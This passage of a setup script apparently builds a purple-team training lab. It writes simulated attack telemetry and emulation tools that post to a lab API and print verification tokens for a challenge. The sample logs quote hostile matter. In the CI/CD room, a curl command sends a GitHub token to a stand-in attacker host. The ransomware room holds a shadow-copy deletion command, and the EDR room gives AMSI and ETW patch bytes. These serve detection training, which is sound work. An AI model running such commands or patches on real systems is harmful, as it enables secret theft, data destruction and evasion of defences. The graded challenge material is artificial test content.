        "action_path": "C:\\Windows\\Temp\\updater.ps1",
        "trigger": "ONLOGON"
    }
    res = http_post("/api/persistence/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PERSISTENCE_EMULATION_VERIFIED":
        print("\n[+] Verification Token: PERSISTENCE_EMULATION_VERIFIED")
elif "--remediate" in args:
    payload = {
        "task_name": "SecurityTelemetryUpdate",
        "remediation_action": "REVOKE_AND_PURGE"
    }
    res = http_post("/api/persistence/remediate", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_PERSISTENCE_REMEDIATION",
        "task_deleted": True,
        "remediation_action": "REVOKE_AND_PURGE"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "PERSISTENCE_REMEDIATION_VALIDATED":
        print("\n[+] Verification Token: PERSISTENCE_REMEDIATION_VALIDATED")
else:
    print("Usage: persistence_emulation_tool.py [--show-telemetry | --emulate-task | --remediate | --challenge]")
EOF
chmod +x /home/operator/tools/persistence_emulation_tool.py

# ============================================================================
# PURPLE TEAM ROOM 09: COMMAND & CONTROL (C2) TRAFFIC EMULATION
# ============================================================================
mkdir -p /var/log/c2
cat << 'EOF' > /var/log/c2/beacon_traffic_events.json
[
  {
    "timestamp": "2026-11-15T13:00:15Z",
    "src_ip": "10.10.14.10",
    "dst_ip": "10.10.14.90",
    "dst_port": 8309,
    "method": "POST",
    "uri": "/api/v1/ping",
    "interval_seconds": 15,
    "jitter_pct": 20,
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Trident/7.0"
  },
  {
    "timestamp": "2026-11-15T13:00:32Z",
    "src_ip": "10.10.14.10",
    "dst_ip": "10.10.14.90",
    "dst_port": 8309,
    "method": "POST",
    "uri": "/api/v1/ping",
    "interval_seconds": 17,
    "jitter_pct": 20,
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Trident/7.0"
  }
]
EOF
chmod 644 /var/log/c2/beacon_traffic_events.json

cat << 'EOF' > /home/operator/tools/c2_emulation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8309
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/c2/beacon_traffic_events.json") as f:
        print(f.read())
elif "--emulate-beacon" in args:
    payload = {
        "target_path": "/api/v1/ping",
        "sleep_interval": 15,
        "jitter": 20
    }
    res = http_post("/api/c2/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "C2_BEACON_EMULATION_VERIFIED":
        print("\n[+] Verification Token: C2_BEACON_EMULATION_VERIFIED")
elif "--tune-detection" in args:
    payload = {
        "rule_id": "SIG-C2-01",
        "action": "ENABLE_VARIANCE_CHECK"
    }
    res = http_post("/api/c2/tune-detection", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_C2_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "C2_DETECTION_VALIDATED":
        print("\n[+] Verification Token: C2_DETECTION_VALIDATED")
else:
    print("Usage: c2_emulation_tool.py [--show-telemetry | --emulate-beacon | --tune-detection | --challenge]")
EOF
chmod +x /home/operator/tools/c2_emulation_tool.py

# ============================================================================
# PURPLE TEAM ROOM 10: EMULATING DATA EXFILTRATION TECHNIQUES
# ============================================================================
mkdir -p /var/log/exfil
cat << 'EOF' > /var/log/exfil/staging_egress_events.json
[
  {
    "timestamp": "2026-11-15T13:10:02Z",
    "action": "STAGE_ARCHIVE",
    "staging_path": "/tmp/.staging_vault/db_export.7z",
    "file_count": 14,
    "archive_size_bytes": 48200000,
    "technique": "T1560.001"
  },
  {
    "timestamp": "2026-11-15T13:10:45Z",
    "action": "NETWORK_EGRESS",
    "dest_ip": "198.51.100.88",
    "dest_port": 443,
    "bytes_sent": 48200000,
    "protocol": "HTTPS_POST",
    "technique": "T1041"
  }
]
EOF
chmod 644 /var/log/exfil/staging_egress_events.json

cat << 'EOF' > /home/operator/tools/exfil_emulation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8310
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/exfil/staging_egress_events.json") as f:
        print(f.read())
elif "--emulate-exfil" in args:
    payload = {
        "bytes": 48200000,
        "staging_path": "/tmp/.staging_vault/db_export.7z"
    }
    res = http_post("/api/exfil/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "EXFILTRATION_EMULATION_VERIFIED":
        print("\n[+] Verification Token: EXFILTRATION_EMULATION_VERIFIED")
elif "--tune-dlp" in args:
    payload = {
        "policy_id": "DLP-EGRESS-01",
        "action": "ENFORCE_THRESHOLD"
    }
    res = http_post("/api/exfil/tune-dlp", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_EXFILTRATION_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "EXFILTRATION_DETECTION_VALIDATED":
        print("\n[+] Verification Token: EXFILTRATION_DETECTION_VALIDATED")
else:
    print("Usage: exfil_emulation_tool.py [--show-telemetry | --emulate-exfil | --tune-dlp | --challenge]")
EOF
chmod +x /home/operator/tools/exfil_emulation_tool.py

# ============================================================================
# PURPLE TEAM ROOM 11: RANSOMWARE ATTACK EMULATION & READINESS
# ============================================================================
mkdir -p /var/log/ransomware /home/operator/decoy
cat << 'EOF' > /var/log/ransomware/precursor_events.json
[
  {
    "timestamp": "2026-11-15T13:20:11Z",
    "process_name": "vssadmin.exe",
    "command_line": "vssadmin delete shadows /all /quiet",
    "user": "NT AUTHORITY\\SYSTEM",
    "event_id": 4688,
    "technique": "T1490"
  },
  {
    "timestamp": "2026-11-15T13:20:14Z",
    "process_name": "crypto_sim.exe",
    "file_accessed": "/home/operator/decoy/finance_q4_canary.xlsx",
    "access_type": "WRITE_ACCESS",
    "alert": "CANARY_FILE_TOUCH_DETECTED",
    "technique": "T1486"
  }
]
EOF
chmod 644 /var/log/ransomware/precursor_events.json

echo "CONFIDENTIAL_CANARY_FINANCE_DATA_Q4_RESERVES" > /home/operator/decoy/finance_q4_canary.xlsx
chmod 644 /home/operator/decoy/finance_q4_canary.xlsx

cat << 'EOF' > /home/operator/tools/ransomware_emulation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8311
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/ransomware/precursor_events.json") as f:
        print(f.read())
elif "--emulate-precursors" in args:
    payload = {
        "canary_touched": "finance_q4_canary.xlsx"
    }
    res = http_post("/api/ransomware/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "RANSOMWARE_EMULATION_VERIFIED":
        print("\n[+] Verification Token: RANSOMWARE_EMULATION_VERIFIED")
elif "--tune-canary" in args:
    payload = {
        "canary_path": "/home/operator/decoy/finance_q4_canary.xlsx",
        "action": "ARM_CANARY_ALERT"
    }
    res = http_post("/api/ransomware/tune-canary", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_RANSOMWARE_READINESS"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "RANSOMWARE_READINESS_VALIDATED":
        print("\n[+] Verification Token: RANSOMWARE_READINESS_VALIDATED")
else:
    print("Usage: ransomware_emulation_tool.py [--show-telemetry | --emulate-precursors | --tune-canary | --challenge]")
EOF
chmod +x /home/operator/tools/ransomware_emulation_tool.py

# ============================================================================
# PURPLE TEAM ROOM 12: CLOUD IDENTITY & IAM PRIVILEGE ESCALATION
# ============================================================================
mkdir -p /var/log/cloud
cat << 'EOF' > /var/log/cloud/cloudtrail_iam_events.json
[
  {
    "timestamp": "2026-11-15T13:30:11Z",
    "event_source": "sts.amazonaws.com",
    "event_name": "AssumeRole",
    "source_ip": "10.10.14.10",
    "userIdentity": {
      "type": "AssumedRole",
      "arn": "arn:aws:iam::123456789012:role/app-workload-role"
    },
    "requestParameters": {
      "roleArn": "arn:aws:iam::123456789012:role/ProdSecOpsAdminRole",
      "roleSessionName": "operator_cloud_session"
    },
    "technique": "T1552.005"
  }
]
EOF
chmod 644 /var/log/cloud/cloudtrail_iam_events.json

cat << 'EOF' > /home/operator/tools/cloud_iam_emulation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8312
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/cloud/cloudtrail_iam_events.json") as f:
        print(f.read())
elif "--emulate-assume-role" in args:
    payload = {
        "target_role": "ProdSecOpsAdminRole"
    }
    res = http_post("/api/cloud/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CLOUD_IAM_EMULATION_VERIFIED":
        print("\n[+] Verification Token: CLOUD_IAM_EMULATION_VERIFIED")
elif "--tune-pipeline" in args:
    payload = {
        "pipeline_id": "ALERT-CLOUD-IAM-01",
        "action": "ENABLE_ANOMALY_DETECTION"
    }
    res = http_post("/api/cloud/tune-pipeline", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_CLOUD_IDENTITY_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CLOUD_IDENTITY_DETECTION_VALIDATED":
        print("\n[+] Verification Token: CLOUD_IDENTITY_DETECTION_VALIDATED")
else:
    print("Usage: cloud_iam_emulation_tool.py [--show-telemetry | --emulate-assume-role | --tune-pipeline | --challenge]")
EOF
chmod +x /home/operator/tools/cloud_iam_emulation_tool.py

# ============================================================================
# PURPLE TEAM ROOM 13: SUPPLY CHAIN & DEPENDENCY CONFUSION EMULATION
# ============================================================================
mkdir -p /var/log/supply_chain
cat << 'EOF' > /var/log/supply_chain/build_dependency_events.json
[
  {
    "timestamp": "2026-11-15T13:40:02Z",
    "package_manager": "pip",
    "requested_package": "voltcorp-auth-core",
    "resolved_version": "99.0.0",
    "resolved_source": "https://pypi.org/simple/voltcorp-auth-core/",
    "internal_source": "https://pypi.voltcorp.internal/simple/",
    "alert": "UNPINNED_INTERNAL_PACKAGE_RESOLUTION_FROM_PUBLIC_INDEX",
    "technique": "T1195.001"
  }
]
EOF
chmod 644 /var/log/supply_chain/build_dependency_events.json

cat << 'EOF' > /home/operator/tools/supply_chain_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8313
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/supply_chain/build_dependency_events.json") as f:
        print(f.read())
elif "--emulate-confusion" in args:
    payload = {
        "package_name": "voltcorp-auth-core",
        "registry": "public_pypi"
    }
    res = http_post("/api/supply-chain/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "SUPPLY_CHAIN_EMULATION_VERIFIED":
        print("\n[+] Verification Token: SUPPLY_CHAIN_EMULATION_VERIFIED")
elif "--tune-pinning" in args:
    payload = {
        "repo": "voltcorp/billing-service",
        "action": "ENFORCE_INTERNAL_INDEX_PINNING"
    }
    res = http_post("/api/supply-chain/tune-pinning", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_SUPPLY_CHAIN_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "SUPPLY_CHAIN_DETECTION_VALIDATED":
        print("\n[+] Verification Token: SUPPLY_CHAIN_DETECTION_VALIDATED")
else:
    print("Usage: supply_chain_tool.py [--show-telemetry | --emulate-confusion | --tune-pinning | --challenge]")
EOF
chmod +x /home/operator/tools/supply_chain_tool.py

# ============================================================================
# PURPLE TEAM ROOM 14: API SECURITY & BROKEN OBJECT LEVEL AUTH (BOLA) EMULATION
# ============================================================================
mkdir -p /var/log/api_abuse
cat << 'EOF' > /var/log/api_abuse/api_access_events.json
[
  {
    "timestamp": "2026-11-15T13:45:15Z",
    "method": "GET",
    "path": "/api/v2/users/usr-90124/profile",
    "authenticated_user": "usr-10442",
    "target_resource_owner": "usr-90124",
    "status_code": 200,
    "user_agent": "python-requests/2.31.0",
    "alert": "UNAUTHORIZED_OBJECT_ID_TRAVERSAL",
    "technique": "T1595.002"
  }
]
EOF
chmod 644 /var/log/api_abuse/api_access_events.json

cat << 'EOF' > /home/operator/tools/api_abuse_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8314
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/api_abuse/api_access_events.json") as f:
        print(f.read())
elif "--emulate-bola" in args:
    payload = {
        "target_user_id": "usr-90124",
        "request_method": "GET"
    }
    res = http_post("/api/api-abuse/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "BOLA_EMULATION_VERIFIED":
        print("\n[+] Verification Token: BOLA_EMULATION_VERIFIED")
elif "--tune-gateway" in args:
    payload = {
        "endpoint": "/api/v2/users/{id}/profile",
        "action": "ENFORCE_OBJECT_LEVEL_AUTHZ"
    }
    res = http_post("/api/api-abuse/tune-gateway", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_API_ABUSE_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "API_ABUSE_DETECTION_VALIDATED":
        print("\n[+] Verification Token: API_ABUSE_DETECTION_VALIDATED")
else:
    print("Usage: api_abuse_tool.py [--show-telemetry | --emulate-bola | --tune-gateway | --challenge]")
EOF
chmod +x /home/operator/tools/api_abuse_tool.py

# ============================================================================
# PURPLE TEAM ROOM 15: ACTIVE DIRECTORY ATTACKS EMULATION (KERBEROASTING)
# ============================================================================
mkdir -p /var/log/ad_attacks
cat << 'EOF' > /var/log/ad_attacks/kerberos_audit_events.json
[
  {
    "timestamp": "2026-11-15T13:50:22Z",
    "event_id": 4769,
    "service_name": "MSSQLSvc/db01.corp.internal:1433",
    "service_sid": "S-1-5-21-204123567-109238472-83746123-1105",
    "ticket_encryption_type": "0x17",
    "ticket_options": "0x40810000",
    "target_domain_name": "CORP.INTERNAL",
    "client_address": "10.10.14.10",
    "alert": "POTENTIAL_KERBEROASTING_RC4_TICKET_REQUESTED",
    "technique": "T1558.003"
  }
]
EOF
chmod 644 /var/log/ad_attacks/kerberos_audit_events.json

cat << 'EOF' > /home/operator/tools/ad_attacks_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8315
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/ad_attacks/kerberos_audit_events.json") as f:
        print(f.read())
elif "--emulate-kerberoast" in args:
    payload = {
        "target_spn": "MSSQLSvc/db01.corp.internal:1433",
        "encryption_type": "0x17"
    }
    res = http_post("/api/ad-attacks/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "KERBEROASTING_EMULATION_VERIFIED":
        print("\n[+] Verification Token: KERBEROASTING_EMULATION_VERIFIED")
elif "--tune-dc-rule" in args:
    payload = {
        "rule_id": "RULE-AD-KERB-4769",
        "action": "ALERT_UNUSUAL_RC4_TGS_REQUESTS"
    }
    res = http_post("/api/ad-attacks/tune-dc-rule", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_AD_ATTACK_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "AD_ATTACK_DETECTION_VALIDATED":
        print("\n[+] Verification Token: AD_ATTACK_DETECTION_VALIDATED")
else:
    print("Usage: ad_attacks_tool.py [--show-telemetry | --emulate-kerberoast | --tune-dc-rule | --challenge]")
EOF
chmod +x /home/operator/tools/ad_attacks_tool.py

# ============================================================================
# PURPLE TEAM ROOM 16: CI/CD PIPELINE & GITHUB ACTIONS ATTACK EMULATION
# ============================================================================
mkdir -p /var/log/cicd
cat << 'EOF' > /var/log/cicd/workflow_run_events.json
[
  {
    "timestamp": "2026-11-15T13:55:40Z",
    "workflow": "pr-builder.yml",
    "trigger_event": "pull_request_target",
    "sender": "external-contributor-42",
    "injected_command": "curl -X POST https://attacker.c2.internal/exfil --data GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}",
    "runner_os": "ubuntu-latest",
    "alert": "UNTRUSTED_PULL_REQUEST_CONTEXT_INJECTION",
    "technique": "T1195.002"
  }
]
EOF
chmod 644 /var/log/cicd/workflow_run_events.json

cat << 'EOF' > /home/operator/tools/cicd_pipeline_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8316
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/cicd/workflow_run_events.json") as f:
        print(f.read())
elif "--emulate-pipeline-attack" in args:
    payload = {
        "workflow_name": "pr-builder.yml",
        "untrusted_input": "${{ github.event.pull_request.title }}"
    }
    res = http_post("/api/cicd/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CICD_PIPELINE_EMULATION_VERIFIED":
        print("\n[+] Verification Token: CICD_PIPELINE_EMULATION_VERIFIED")
elif "--tune-pipeline-audit" in args:
    payload = {
        "pipeline_id": "PR-WORKFLOW-VALIDATOR",
        "action": "RESTRICT_ACTIONS_TOKEN_PERMISSIONS"
    }
    res = http_post("/api/cicd/tune-pipeline-audit", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_CICD_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CICD_PIPELINE_DETECTION_VALIDATED":
        print("\n[+] Verification Token: CICD_PIPELINE_DETECTION_VALIDATED")
else:
    print("Usage: cicd_pipeline_tool.py [--show-telemetry | --emulate-pipeline-attack | --tune-pipeline-audit | --challenge]")
EOF
chmod +x /home/operator/tools/cicd_pipeline_tool.py

# ============================================================================
# PURPLE TEAM ROOM 17: EDR TELEMETRY BLINDING & BYPASS EMULATION
# ============================================================================
mkdir -p /var/log/edr_bypass
cat << 'EOF' > /var/log/edr_bypass/amsi_etw_events.json
[
  {
    "timestamp": "2026-11-15T14:10:12Z",
    "event_id": "ETW_PROVIDER_DISABLE",
    "provider_guid": "{802ec45a-1e99-4b83-9920-87c98277ba9d}",
    "process_name": "powershell.exe",
    "pid": 4812,
    "user": "DOMAIN\\victim_user",
    "patch_target": "ntdll!EtwEventWrite",
    "opcode": "RET_PATCH_0xC3",
    "alert": "ETW_TI_TAMPERING_DETECTED",
    "technique": "T1562.001"
  },
  {
    "timestamp": "2026-11-15T14:10:45Z",
    "event_id": "AMSI_BUFFER_PATCH",
    "target_dll": "amsi.dll",
    "target_export": "AmsiScanBuffer",
    "patch_bytes": "B8 57 00 07 80 C3",
    "result": "AMSI_RESULT_CLEAN_FORCE",
    "technique": "T1562.001"
  }
]
EOF
chmod 644 /var/log/edr_bypass/amsi_etw_events.json

cat << 'EOF' > /home/operator/tools/edr_bypass_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8317
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/edr_bypass/amsi_etw_events.json") as f:
        print(f.read())
elif "--emulate-bypass" in args or "--emulate" in args:
    payload = {
        "bypass_technique": "ETW_TI_TAMPERING",
        "target_provider": "Microsoft-Windows-Threat-Intelligence"
    }
    res = http_post("/api/edr-bypass/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "EDR_BYPASS_EMULATION_VERIFIED":
        print("\n[+] Verification Token: EDR_BYPASS_EMULATION_VERIFIED")
elif "--tune-etw" in args:
    payload = {
        "etw_provider": "ThreatIntelligence-ETW",
        "tamper_protection": "ENABLE_KERNEL_INTEGRITY"
    }
    res = http_post("/api/edr-bypass/tune-etw", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_EDR_BYPASS_DETECTION"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "EDR_BYPASS_DETECTION_VALIDATED":
        print("\n[+] Verification Token: EDR_BYPASS_DETECTION_VALIDATED")
else:
    print("Usage: edr_bypass_tool.py [--show-telemetry | --emulate-bypass | --tune-etw | --challenge]")
EOF
chmod +x /home/operator/tools/edr_bypass_tool.py

# ============================================================================
# PURPLE TEAM ROOM 18: TTP HEATMAP GENERATION & COVERAGE SCORING
# ============================================================================
mkdir -p /var/log/heatmap
cat << 'EOF' > /var/log/heatmap/attck_coverage_matrix.json
[
  {
    "technique_id": "T1059.001",
    "name": "PowerShell",
    "tactic": "Execution",
    "red_emulated": true,
    "blue_detected": true,
    "coverage_score": 100,
    "rule_ids": ["SIGMA-PS-001", "SPLUNK-WIN-POWERSHELL-ENCODED"]
  },
  {
    "technique_id": "T1055.001",
    "name": "Dynamic-link Library Injection",
    "tactic": "Defense Evasion",
    "red_emulated": true,
    "blue_detected": false,
    "coverage_score": 25,
    "gap_note": "Sysmon Event ID 8 missing filter for ntdll injection"
  },
  {
    "technique_id": "T1003.001",
    "name": "LSASS Memory",
    "tactic": "Credential Access",
    "red_emulated": true,
    "blue_detected": true,
    "coverage_score": 90,
    "rule_ids": ["SYSMON-10-LSASS-DUMP"]
  }
]
EOF
chmod 644 /var/log/heatmap/attck_coverage_matrix.json

cat << 'EOF' > /home/operator/tools/heatmap_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8318
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/heatmap/attck_coverage_matrix.json") as f:
        print(f.read())
elif "--emulate-scoring" in args or "--emulate" in args:
    payload = {
        "layer_format": "ATT&CK-Navigator-v4.3",
        "active_techniques": ["T1059", "T1055", "T1003", "T1078"]
    }
    res = http_post("/api/heatmap/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "HEATMAP_EMULATION_VERIFIED":
        print("\n[+] Verification Token: HEATMAP_EMULATION_VERIFIED")
elif "--tune-overlay" in args:
    payload = {
        "heatmap_overlay": "ENTERPRISE_ATT&CK_DEFENSE",
        "coverage_threshold": 85
    }
    res = http_post("/api/heatmap/tune-overlay", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_HEATMAP_COVERAGE"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "HEATMAP_COVERAGE_VALIDATED":
        print("\n[+] Verification Token: HEATMAP_COVERAGE_VALIDATED")
else:
    print("Usage: heatmap_tool.py [--show-telemetry | --emulate-scoring | --tune-overlay | --challenge]")
EOF
chmod +x /home/operator/tools/heatmap_tool.py

# ============================================================================
# PURPLE TEAM ROOM 19: CONTINUOUS SECURITY VALIDATION & AUTOMATED TESTING
# ============================================================================
mkdir -p /var/log/continuous_validation
cat << 'EOF' > /var/log/continuous_validation/pipeline_run_history.json
[
  {
    "run_id": "RUN-2026-CSV-101",
    "timestamp": "2026-11-15T14:15:30Z",
    "suite": "nightly-atomic-red-canary",
    "tests_total": 45,
    "tests_detected": 42,
    "tests_prevented": 38,
    "coverage_pct": 93.3,
    "failed_simulations": [
      {
        "atomic_id": "T1547.001-RegKeyAdd",
        "reason": "Detection latency exceeded 120s SLA"
      }
    ]
  }
]
EOF
chmod 644 /var/log/continuous_validation/pipeline_run_history.json

cat << 'EOF' > /home/operator/tools/continuous_validation_tool.py
#!/usr/bin/env python3
import sys
import os
import json
import urllib.request

TARGET_HOST = os.getenv("TARGET_HOST", "10.10.14.90")
TARGET_PORT = 8319
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

def http_post(path, data):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as res:
            return json.loads(res.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

args = sys.argv[1:]
if "--show-telemetry" in args:
    with open("/var/log/continuous_validation/pipeline_run_history.json") as f:
        print(f.read())
elif "--emulate-pipeline" in args or "--emulate" in args:
    payload = {
        "simulation_id": "SIM-PURPLE-RUN-992",
        "frequency": "DAILY_SCHEDULED"
    }
    res = http_post("/api/continuous-validation/emulate", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CONTINUOUS_VALIDATION_EMULATION_VERIFIED":
        print("\n[+] Verification Token: CONTINUOUS_VALIDATION_EMULATION_VERIFIED")
elif "--tune-guardrails" in args:
    payload = {
        "pipeline_guardrail": "CANARY_TOKEN_SAFEGUARDS",
        "status": "ENFORCED"
    }
    res = http_post("/api/continuous-validation/tune-guardrails", payload)
    print(json.dumps(res, indent=2))
elif "--challenge" in args or "--finalize" in args:
    payload = {
        "action": "VALIDATE_CONTINUOUS_SECURITY_PIPELINE"
    }
    res = http_post("/challenge", payload)
    print(json.dumps(res, indent=2))
    if res.get("status") == "CONTINUOUS_VALIDATION_DETECTION_VALIDATED":
